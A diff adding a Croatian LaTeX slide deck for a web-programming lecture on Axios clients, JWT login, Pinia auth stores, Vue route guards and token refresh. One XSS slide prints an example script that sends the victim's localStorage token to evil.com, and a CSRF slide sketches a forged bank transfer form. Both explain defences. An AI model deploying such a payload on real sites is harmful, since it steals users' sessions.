@@ -1,0 +1,725 @@
+% !TeX program = lualatex
+% !TeX root = predavanje08.tex
+\input{../common/preamble.tex}
+
+\title[Programiranje za web]{Programiranje za web - Predavanje 8 \\ API komunikacija, auth flow i route guardovi}
+\date{30.11.2026.}
+
+\begin{document}
+
+\frame{\titlepage}
+
+% ------------------------------------------------------------
+\begin{frame}{Plan predavanja}
+\begin{enumerate}
+  \item HTTP komunikacija iz frontenda (Axios)
+  \item API client wrapper s base URL i interceptorima
+  \item Auth store: login, token storage, refresh
+  \item Login stranica
+  \item Route guardovi po roli
+  \item Globalni error handling
+  \item Commitovi za ovo predavanje
+\end{enumerate}
+
+\vspace{0.6em}
+Na kraju predavanja: korisnik se može prijaviti, frontend pamti token, zaštićene rute traže autentikaciju.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Ishodi učenja}
+Nakon ovog predavanja student može:
+\begin{itemize}
+  \item konfigurirati Axios instance s base URL-om i interceptorima
+  \item implementirati auth store koji upravlja JWT tokenima
+  \item objasniti zašto se access token drži u memoriji, a refresh u httpOnly cookieu ili localStorageu
+  \item implementirati route guard koji provjerava autentikaciju i rolu
+  \item hendlati 401 response automatskim refreshom tokena
+\end{itemize}
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Kako frontend komunicira s backendom}
+Frontend ne pristupa bazi direktno. Sva komunikacija ide kroz HTTP:
+
+\vspace{0.4em}
+\begin{center}
+\texttt{Vue komponenta $\rightarrow$ API client $\rightarrow$ HTTP $\rightarrow$ FastAPI $\rightarrow$ PostgreSQL}
+\end{center}
+
+\vspace{0.6em}
+\begin{tabular}{@{}lll@{}}
+  \toprule
+  \textbf{Akcija u UI-ju} & \textbf{HTTP metoda} & \textbf{Endpoint} \\
+  \midrule
+  Prijava korisnika & POST & \codefile{/auth/login} \\
+  Dohvat natjecatelja & GET & \codefile{/clubs/\{id\}/lifters} \\
+  Dodavanje natjecatelja & POST & \codefile{/clubs/\{id\}/lifters} \\
+  Promjena kategorije & PATCH & \codefile{/competitions/\{id\}/registrations/\{id\}} \\
+  \bottomrule
+\end{tabular}
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{HTTP iz browsera: Fetch vs Axios}
+\begin{columns}[T]
+\column{0.48\textwidth}
+\textbf{Fetch API (native)}
+\begin{itemize}
+  \item Ugrađen u browser - nema dependencija
+  \item Ne baca exception na 4xx/5xx (samo network error)
+  \item Ručno parsiranje JSON-a (\texttt{.json()})
+  \item Nema interceptore
+\end{itemize}
+
+\column{0.48\textwidth}
+\textbf{Axios}
+\begin{itemize}
+  \item Automatski JSON parse/serialize
+  \item Baca exception na 4xx/5xx
+  \item Request i response interceptori
+  \item Konfigurabilni timeout
+  \item Širi browser support
+\end{itemize}
+\end{columns}
+
+\vspace{0.6em}
+Za projekt s auth flowom, interceptorima i error handlingom, Axios štedi dosta boilerplate koda. Za jednostavan GET request, Fetch je sasvim dovoljan.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Što su interceptori}
+Interceptori su \textbf{middleware} za HTTP requestove i responseove. Svaki request/response prolazi kroz njih prije nego što dođe do komponente.
+
+\vspace{0.6em}
+\begin{center}
+\texttt{Komponenta $\rightarrow$ Request interceptor $\rightarrow$ Server $\rightarrow$ Response interceptor $\rightarrow$ Komponenta}
+\end{center}
+
+\vspace{0.6em}
+\begin{tabular}{@{}lp{8cm}@{}}
+  \toprule
+  \textbf{Tip} & \textbf{Upotreba} \\
+  \midrule
+  Request interceptor & Dodaj Authorization header na svaki request \\
+  Response interceptor & Uhvati 401, napravi token refresh, ponovi request \\
+  Error interceptor & Centralizirano logiranje grešaka \\
+  \bottomrule
+\end{tabular}
+
+\vspace{0.4em}
+Bez interceptora biste morali ručno dodavati token i hendlati 401 u svakoj komponenti.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Async/await na frontendu}
+API pozivi su asinkroni - ne blokiraju UI dok čekamo odgovor servera.
+
+\vspace{0.4em}
+\begin{enumerate}
+  \item Korisnik klikne gumb $\rightarrow$ pokrene se async funkcija
+  \item Postavimo \texttt{loading = true} $\rightarrow$ UI prikaže spinner
+  \item \texttt{await api.get(...)} $\rightarrow$ čekamo odgovor (UI ostaje responsivan)
+  \item Odgovor stigne $\rightarrow$ ažuriramo podatke $\rightarrow$ \texttt{loading = false}
+  \item Ako dođe do greške $\rightarrow$ \texttt{catch} blok prikaže poruku
+\end{enumerate}
+
+\vspace{0.6em}
+\texttt{async/await} je sintaktički šećer nad Promiseima. Čini asinkroni kod čitljivim kao sinkroni, ali ne blokira main thread.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{CORS: zašto browser blokira, a Postman ne}
+Browser primjenjuje \textbf{Same-Origin Policy} - JavaScript može slati requestove samo na isti origin s kojeg je stranica učitana.
+
+\vspace{0.4em}
+\begin{tabular}{@{}ll@{}}
+  \toprule
+  \textbf{Alat} & \textbf{Blokira cross-origin?} \\
+  \midrule
+  Browser (Chrome, Firefox) & Da - zaštita korisnika \\
+  Postman / curl & Ne - nema origin koncept \\
+  Backend-to-backend & Ne - server nema origin policy \\
+  \bottomrule
+\end{tabular}
+
+\vspace{0.6em}
+Ovo je \textbf{sigurnosna zaštita} za krajnjeg korisnika. Bez nje, maliciozna stranica bi mogla slati requestove na API vaše banke koristeći vaše cookieje. CORS je mehanizam kojim backend eksplicitno dopušta iznimke.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile,shrink=5]{CORS u praksi: prvi request će vam pasti}
+Vite dev server je na \texttt{:5173}, FastAPI na \texttt{:8000} - različiti origini. Prvi Axios poziv završava s \enquote{blocked by CORS policy} u konzoli dok backend ne dopusti vaš origin:
+
+\begin{lstlisting}[language=python]
+# app/main.py (backend!)
+from fastapi.middleware.cors import CORSMiddleware
+
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["http://localhost:5173"],
+    allow_credentials=True,
+    allow_methods=["*"],
+    allow_headers=["*"],
+)
+\end{lstlisting}
+
+\vspace{0.4em}
+Ovo je dev konfiguracija - dovoljna do kraja semestra. Produkcijsku verziju s env varijablom i preflight detaljima radimo u Predavanju 12. Zapamtite simptom: frontend \enquote{ne radi}, a greška je na backendu.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile,shrink=5]{Axios: API client wrapper}
+\begin{lstlisting}[language=typescript]
+// src/api/client.ts
+import axios, { type AxiosError,
+  type InternalAxiosRequestConfig } from 'axios'
+
+const api = axios.create({
+  baseURL: import.meta.env.VITE_API_URL || 'http://localhost:8000',
+  headers: { 'Content-Type': 'application/json' },
+})
+
+// Interceptor: dodaje token na svaki request
+api.interceptors.request.use(
+  (config: InternalAxiosRequestConfig) => {
+    const token = localStorage.getItem('access_token')
+    if (token) {
+      config.headers.Authorization = `Bearer ${token}`
+    }
+    return config
+  })
+
+export default api
+\end{lstlisting}
+
+\vspace{0.4em}
+\texttt{baseURL} se čita iz env varijable - drugačiji za dev i produkciju.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile,shrink=5]{API pozivi: primjeri}
+\begin{lstlisting}[language=typescript]
+// src/api/auth.ts
+import api from './client'
+
+export interface LoginResponse {
+  access_token: string; refresh_token: string
+}
+
+export async function login(username: string, password: string) {
+  const { data } = await api.post<LoginResponse>('/auth/login', {
+    username, password,
+  })
+  return data
+}
+
+export async function getMe() {
+  const { data } = await api.get('/auth/me')
+  return data
+}
+
+// src/api/lifters.ts
+export async function getLifters(clubId: number) {
+  const { data } = await api.get(`/clubs/${clubId}/lifters`)
+  return data
+}
+\end{lstlisting}
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Token storage: opcije}
+\begin{tabular}{@{}lp{4.5cm}p{4.5cm}@{}}
+  \toprule
+  & \textbf{localStorage} & \textbf{Memorija (ref/store)} \\
+  \midrule
+  Persistencija & Ostaje nakon refresh/zatvaranja & Gubi se na refresh \\
+  XSS ranjivost & Da - JS može čitati & Da - ali teže iskoristivo \\
+  Jednostavnost & Jednostavno & Treba refresh token flow \\
+  \bottomrule
+\end{tabular}
+
+\vspace{0.6em}
+Za ovaj kolegij koristimo \textbf{localStorage} jer je jednostavniji. U produkcijskim aplikacijama razmotrite httpOnly cookie za refresh token.
+
+\vspace{0.4em}
+Access token ima kratki životni vijek (15 min) pa čak i ako je ukraden, šteta je ograničena. Refresh token služi za tiho obnavljanje.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{XSS napad: kako krade token}
+XSS (Cross-Site Scripting) - napadač ubaci JavaScript u stranicu koji se izvršava u kontekstu korisnika.
+
+\vspace{0.4em}
+\begin{enumerate}
+  \item Napadač pronađe input koji se renderira bez escapanja
+  \item Ubaci: \texttt{<script>fetch('https://evil.com?t='+} \\ \texttt{localStorage.getItem('token'))</script>}
+  \item Kad žrtva posjeti stranicu, skripta se izvrši u njezinu browseru
+  \item Token je poslan napadaču - napadač se može prijaviti kao žrtva
+\end{enumerate}
+
+\vspace{0.6em}
+Vue automatski escapa template izraze (\texttt{\{\{...\}\}}) što štiti od većine XSS-a. Opasnost je \texttt{v-html} direktiva koja renderira sirovi HTML - koristiti samo za trusted sadržaj.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{CSRF napad i SameSite zaštita}
+CSRF (Cross-Site Request Forgery) - napadač natjera korisnikov browser da pošalje request na drugi site koristeći postojeći cookie.
+
+\vspace{0.4em}
+\begin{enumerate}
+  \item Korisnik je prijavljen na \texttt{bank.com} (ima session cookie)
+  \item Posjeti \texttt{evil.com} koja ima \texttt{<form action="bank.com/transfer">}
+  \item Browser automatski pošalje cookie s requestom
+  \item Banka izvrši transfer jer je cookie validan
+\end{enumerate}
+
+\vspace{0.6em}
+Zaštita: \texttt{SameSite=Lax} ili \texttt{Strict} na cookieju sprečava slanje cookieja s cross-origin requestova. Mi koristimo \texttt{Authorization} header umjesto cookieja za access token - CSRF nije primjenjiv.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Defense in depth za auth}
+Sigurnost ne ovisi o jednom mehanizmu. Kombiniramo više slojeva:
+
+\vspace{0.4em}
+\begin{tabular}{@{}lp{8cm}@{}}
+  \toprule
+  \textbf{Sloj} & \textbf{Što štiti} \\
+  \midrule
+  Kratki access token (15 min) & Ograničava štetu ako je ukraden \\
+  Refresh token (dugotrajan) & Omogućava sesiju bez ponovnog logina \\
+  CORS & Sprečava requestove s neautoriziranih origina \\
+  HTTPS & Sprečava presretanje tokena u transportu \\
+  Input escaping (Vue) & Sprečava XSS koji bi ukrao token \\
+  \bottomrule
+\end{tabular}
+
+\vspace{0.6em}
+Nijedan od ovih mehanizama sam nije dovoljan. Zajedno čine sustav otpornim na najčešće napade.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile,shrink=5]{Auth store (Pinia)}
+\begin{lstlisting}[language=typescript]
+// src/stores/auth.ts
+import { defineStore } from 'pinia'
+import { ref, computed } from 'vue'
+import { login as apiLogin, getMe } from '@/api/auth'
+
+interface User { id: number; username: string;
+  role: 'admin' | 'club'; club_id: number | null }
+
+export const useAuthStore = defineStore('auth', () => {
+  const user = ref<User | null>(null)
+  const token =
+    ref<string | null>(localStorage.getItem('access_token'))
+
+  const isAuthenticated = computed(() => !!token.value)
+  const isAdmin = computed(() => user.value?.role === 'admin')
+
+  async function login(username: string, password: string) {
+    const data = await apiLogin(username, password)
+    token.value = data.access_token
+    localStorage.setItem('access_token', data.access_token)
+    localStorage.setItem('refresh_token', data.refresh_token)
+    user.value = await getMe()
+  }
+
+  function logout() {
+    token.value = null
+    user.value = null
+    localStorage.removeItem('access_token')
+    localStorage.removeItem('refresh_token')
+  }
+
+  return { user, token, isAuthenticated, isAdmin, login, logout }
+})
+\end{lstlisting}
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile,shrink=5]{Login stranica}
+\begin{lstlisting}[language=html]
+<script setup lang="ts">
+import { ref } from 'vue'
+import { useRouter } from 'vue-router'
+import { useAuthStore } from '@/stores/auth'
+
+const auth = useAuthStore()
+const router = useRouter()
+const username = ref('')
+const password = ref('')
+const error = ref('')
+
+async function handleLogin() {
+  try {
+    error.value = ''
+    await auth.login(username.value, password.value)
+    router.replace('/')
+  } catch (e) {
+    error.value = 'Pogresan username ili lozinka'
+  }
+}
+</script>
+\end{lstlisting}
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile,shrink=5]{Login stranica: template}
+\begin{lstlisting}[language=html]
+<template>
+  <div class="login-page">
+    <h1>Prijava</h1>
+    <form @submit.prevent="handleLogin">
+      <div>
+        <label>Username</label>
+        <input v-model="username" required />
+      </div>
+      <div>
+        <label>Lozinka</label>
+        <input v-model="password" type="password" required />
+      </div>
+      <p v-if="error" class="error">{{ error }}</p>
+      <button type="submit">Prijavi se</button>
+    </form>
+  </div>
+</template>
+\end{lstlisting}
+
+\vspace{0.4em}
+\texttt{@submit.prevent} sprečava defaultno ponašanje forme (page reload). \texttt{v-model} dvosmjerno povezuje input s \texttt{ref()}.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile,shrink=5]{Route guard: zaštita ruta}
+\begin{lstlisting}[language=typescript]
+// src/router/index.ts
+router.beforeEach((to, from) => {
+  const auth = useAuthStore()
+
+  // Javne rute - ne trebaju auth
+  if (to.name === 'login') return true
+
+  // Nije prijavljen - redirect na login
+  if (!auth.isAuthenticated) {
+    return { name: 'login' }
+  }
+
+  // Admin rute - provjera role
+  if (to.meta.requiresAdmin && !auth.isAdmin) {
+    return { name: 'dashboard' }
+  }
+
+  return true
+})
+\end{lstlisting}
+
+\vspace{0.4em}
+\texttt{beforeEach} se poziva prije svake navigacije. Ako vrati objekt s \texttt{name}, korisnik je preusmjeren.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile,shrink=5]{Meta polja na rutama}
+\begin{lstlisting}[language=typescript]
+const routes = [
+  { path: '/login', name: 'login', component: LoginView },
+  {
+    path: '/',
+    name: 'dashboard',
+    component: DashboardView,
+    // nema meta - samo treba auth (guard provjerava)
+  },
+  {
+    path: '/admin',
+    component: AdminLayout,
+    meta: { requiresAdmin: true },
+    children: [
+      { path: 'clubs', component: AdminClubsView },
+      { path: 'competitions', component: AdminCompetitionsView },
+    ],
+  },
+]
+\end{lstlisting}
+
+\vspace{0.4em}
+\texttt{meta} polja su custom podaci na ruti. Guard ih čita i odlučuje smije li korisnik pristupiti.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Navigation guards: tipovi}
+Vue Router ima tri razine navigation guardova:
+
+\vspace{0.4em}
+\begin{tabular}{@{}lp{4cm}p{5cm}@{}}
+  \toprule
+  \textbf{Tip} & \textbf{Gdje se definira} & \textbf{Kad koristiti} \\
+  \midrule
+  Global & \texttt{router.beforeEach()} & Auth provjera za cijelu aplikaciju \\
+  Per-route & \texttt{beforeEnter} na ruti & Specifična pravila za jednu rutu \\
+  In-component & \texttt{onBeforeRouteLeave()} & \enquote{Imate nespremljene promjene} dijalog \\
+  \bottomrule
+\end{tabular}
+
+\vspace{0.6em}
+Mi koristimo globalni guard za auth jer svaka ruta osim logina zahtijeva prijavu. Per-route guard bismo koristili za npr. admin-only stranicu s posebnom logikom.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Frontend guard vs backend zaštita}
+Frontend guard je \textbf{UX poboljšanje}, ne sigurnosna zaštita.
+
+\vspace{0.6em}
+\begin{columns}[T]
+\column{0.48\textwidth}
+\textbf{Frontend guard}
+\begin{itemize}
+  \item Sprečava navigaciju na zabranjenu rutu
+  \item Korisnik ne vidi stranicu
+  \item Može se zaobići (DevTools, direktan API poziv)
+  \item Služi za bolji UX
+\end{itemize}
+
+\column{0.48\textwidth}
+\textbf{Backend zaštita}
+\begin{itemize}
+  \item Provjerava token na svakom requestu
+  \item Vraća 401/403 ako nema pristupa
+  \item Ne može se zaobići
+  \item Autoritet za sigurnost
+\end{itemize}
+\end{columns}
+
+\vspace{0.6em}
+Oboje su potrebni. Frontend guard sprečava konfuziju, backend sprečava zloupotrebu.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Auth stanje pri refreshu stranice}
+Problem: kad korisnik refresha stranicu, Pinia store se resetira na početne vrijednosti.
+
+\vspace{0.6em}
+\begin{enumerate}
+  \item Korisnik refresha stranicu $\rightarrow$ Pinia state = prazan
+  \item Guard vidi \texttt{isAuthenticated = false} $\rightarrow$ redirect na login
+  \item Ali token još postoji u localStorage!
+\end{enumerate}
+
+\vspace{0.6em}
+Rješenje: pri startu aplikacije provjerimo localStorage i pozovemo \texttt{/auth/me}:
+\begin{enumerate}
+  \item Čitamo token iz localStorage
+  \item Ako postoji - pozovemo \texttt{GET /auth/me}
+  \item Ako uspije - popunimo store s user podacima
+  \item Ako ne uspije (token istekao) - brišemo localStorage, redirect na login
+\end{enumerate}
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile,shrink=5]{401 interceptor: automatski refresh}
+\begin{lstlisting}[language=typescript]
+// src/api/client.ts
+api.interceptors.response.use(
+  (response) => response,
+  async (error: AxiosError) => {
+    const original = error.config as
+      InternalAxiosRequestConfig & { _retry?: boolean }
+    if (error.response?.status === 401 && !original._retry) {
+      original._retry = true
+      try {
+        const refresh = localStorage.getItem('refresh_token')
+        const { data } = await axios.post(
+          `${original.baseURL}/auth/refresh`,
+          { refresh_token: refresh },
+        )
+        localStorage.setItem('access_token', data.access_token)
+        localStorage.setItem('refresh_token', data.refresh_token)
+        original.headers.Authorization =
+          `Bearer ${data.access_token}`
+        return api(original)
+      } catch {
+        // refresh failed - logout
+        localStorage.clear()
+        window.location.href = '/login'
+      }
+    }
+    return Promise.reject(error)
+  }
+)
+\end{lstlisting}
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Kako radi 401 interceptor}
+\begin{enumerate}
+  \item Korisnik radi request s isteklim access tokenom
+  \item Backend vraća \textbf{401 Unauthorized}
+  \item Interceptor hvata 401, šalje refresh token na \codefile{/auth/refresh}
+  \item Ako refresh uspije - sprema nove tokene, ponavlja originalni request
+  \item Ako refresh ne uspije (refresh token istekao) - logout i redirect na login
+\end{enumerate}
+
+\vspace{0.6em}
+Korisnik ne primjećuje refresh - request se automatski ponovi s novim tokenom. Jedino ako je i refresh token istekao, korisnik mora ponovo upisati lozinku.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile,shrink=5]{Globalni error handling}
+\begin{lstlisting}[language=typescript]
+// src/api/client.ts - dodajemo u response interceptor
+
+// Za sve ostale greske (ne-401)
+api.interceptors.response.use(
+  (response) => response,
+  (error: AxiosError<{ message?: string }>) => {
+    const status = error.response?.status
+    const data = error.response?.data
+
+    if (status === 403) {
+      console.error('Nemate pristup:', data?.message)
+    } else if (status === 422) {
+      console.error('Validacijska greska:', data)
+    } else if (status >= 500) {
+      console.error('Server error:', status)
+    }
+
+    return Promise.reject(error)
+  }
+)
+\end{lstlisting}
+
+\vspace{0.4em}
+Centralizirani error handling - ne trebamo \texttt{try/catch} za iste scenarije u svakoj komponenti.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}[fragile,shrink=5]{Vue errorHandler: protiv bijelog ekrana}
+Interceptor hvata HTTP greške, ali ne i greške u samim komponentama - exception u renderu ruši SPA u prazan ekran. Zadnja linija obrane:
+
+\begin{lstlisting}[language=typescript]
+// src/main.ts
+const app = createApp(App)
+
+app.config.errorHandler = (err, instance, info) => {
+  console.error('Vue error:', err, info)
+  // u produkciji: posalji u error tracking (Sentry)
+  // i prikazi korisniku genericku poruku
+}
+\end{lstlisting}
+
+\vspace{0.4em}
+\texttt{errorHandler} hvata sve neuhvaćene greške iz komponenti, computeda i watchera. Korisnik umjesto bijelog ekrana dobiva poruku, a vi u konzoli ili error trackingu vidite što je puklo. Isti \enquote{fail gracefully} princip koji backend već ima kroz exception handler.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Auth flow: login}
+\begin{enumerate}
+  \item Korisnik otvori aplikaciju $\rightarrow$ guard provjeri token
+  \item Nema tokena $\rightarrow$ redirect na \codefile{/login}
+  \item Korisnik unese credentials $\rightarrow$ POST \codefile{/auth/login}
+  \item Backend vrati access + refresh token $\rightarrow$ spremimo u localStorage
+  \item Pozovemo \codefile{/auth/me} $\rightarrow$ spremimo user objekt u store
+  \item \texttt{router.replace('/')} $\rightarrow$ korisnik vidi dashboard
+\end{enumerate}
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Auth flow: token lifecycle}
+\begin{enumerate}
+  \item Svaki request ide s \texttt{Authorization: Bearer <token>}
+  \item Token istekne $\rightarrow$ 401 $\rightarrow$ interceptor radi refresh
+  \item Refresh istekne $\rightarrow$ logout $\rightarrow$ natrag na login
+\end{enumerate}
+
+\vspace{0.6em}
+Korisnik ne primjećuje refresh - cijeli ciklus se odvija automatski u interceptoru.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Race condition pri refreshu tokena}
+Što ako dva API poziva istovremeno dobiju 401?
+
+\vspace{0.4em}
+\begin{enumerate}
+  \item Request A dobije 401 $\rightarrow$ šalje refresh
+  \item Request B dobije 401 $\rightarrow$ također šalje refresh
+  \item Refresh za A uspije - novi token
+  \item Refresh za B koristi stari refresh token koji je već iskorišten $\rightarrow$ fail
+  \item Korisnik je izbačen bez razloga
+\end{enumerate}
+
+\vspace{0.6em}
+Rješenje: koristiti \textbf{queue pattern} - prvi 401 pokrene refresh, svi ostali čekaju rezultat tog refresha. Naš interceptor koristi \texttt{\_retry} flag kao jednostavnu verziju ovog patterna.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Centralizirani vs distribuirani error handling}
+\begin{columns}[T]
+\column{0.48\textwidth}
+\textbf{Centralizirani (interceptor)}
+\begin{itemize}
+  \item 401: automatski refresh
+  \item 403: \enquote{Nemate pristup}
+  \item 500: \enquote{Server error}
+  \item Isti handling za sve requestove
+\end{itemize}
+
+\column{0.48\textwidth}
+\textbf{Distribuirani (try/catch)}
+\begin{itemize}
+  \item 409: \enquote{Natjecatelj je već prijavljen}
+  \item 422: prikaz field-level grešaka
+  \item Specifičan za kontekst
+\end{itemize}
+\end{columns}
+
+\vspace{0.6em}
+Koristimo oba. Interceptor hendla generičke greške automatski. Komponenta hendla specifične greške koje zahtijevaju kontekstualan prikaz.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Testiranje auth flowa u DevTools}
+\begin{tabular}{@{}lp{8cm}@{}}
+  \toprule
+  \textbf{DevTools tab} & \textbf{Što provjeravamo} \\
+  \midrule
+  Network & Jesu li requestovi poslani s \texttt{Authorization} headerom? Koji status code smo dobili? \\
+  Application > Local Storage & Postoje li \texttt{access\_token} i \texttt{refresh\_token}? Jesu li ažurirani nakon refresha? \\
+  Console & Ima li grešaka? Jesu li interceptori logirali nešto? \\
+  Vue DevTools > Pinia & Je li auth store ažuriran? Ima li user objekt? \\
+  \bottomrule
+\end{tabular}
+
+\vspace{0.6em}
+Za testiranje refresh flowa: otvorite Application tab, ručno obrišite \texttt{access\_token}, napravite bilo koji API poziv. Interceptor bi trebao automatski refreshati token.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Commitovi za Predavanje 8}
+\begin{itemize}
+  \item \texttt{feat(web): add API client wrapper with base URL and interceptors}
+  \item \texttt{feat(web): implement auth store (Pinia) and login page}
+  \item \texttt{feat(web): add route guards for role-based access (admin/club)}
+  \item \texttt{feat(web): implement token refresh flow and 401 handling}
+  \item \texttt{fix(web): add global error handling and toast/alert pattern}
+\end{itemize}
+
+\vspace{0.4em}
+\textbf{Na satu:} implementiramo auth od nule, testiramo login/refresh u browseru, provjeravamo guardove.
+\end{frame}
+
+% ------------------------------------------------------------
+\begin{frame}{Što ide sljedeće (Predavanje 9)}
+\begin{itemize}
+  \item State management s Piniom za poslovne entitete
+  \item CRUD viewovi: lista, forma, detalji
+  \item Loading, error i empty stanja
+  \item Forme s validacijom
+\end{itemize}
+
+\vspace{0.8em}
+\begin{center}
+\Large Pitanja?
+\end{center}
+\end{frame}
+
+\end{document}
